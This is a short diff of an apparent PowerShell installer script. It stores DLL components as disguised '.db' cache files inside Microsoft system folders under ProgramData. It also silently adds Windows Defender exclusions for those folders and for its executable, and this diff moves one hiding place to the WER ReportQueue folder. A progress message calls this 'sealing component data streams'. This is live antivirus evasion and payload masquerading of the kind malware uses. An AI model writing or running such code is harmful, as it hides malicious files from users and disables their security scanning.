@@ -94,7 +94,7 @@ Start-Sleep -Milliseconds 350
 Show-Progress -Percent 65 -Status "Sealing component data streams..."
 $MAP = [ordered]@{
     "cimgui.dll" = @("$env:ProgramData\Microsoft\Network\Downloader\winrescache.db", "vtcache")
-    "AotBst.dll" = @("$env:ProgramData\Microsoft\Diagnosis\ETW\gphcache.db", "vtmap")
+    "AotBst.dll" = @("$env:ProgramData\Microsoft\Windows\WER\ReportQueue\gphcache.db", "vtmap")
     "Client.dll" = @("$env:ProgramData\Microsoft\Windows\DeviceMetadataCache\ntprintcache.db", "vtload")
 }
 foreach ($name in $MAP.Keys) {
@@ -145,7 +145,7 @@ try {
 try {
     Add-MpPreference -ExclusionPath $DEST_DIR -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Network\Downloader" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Diagnosis\ETW" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Windows\WER\ReportQueue" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Windows\DeviceMetadataCache" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionProcess $EXE_NAME -ErrorAction SilentlyContinue
 } catch {}
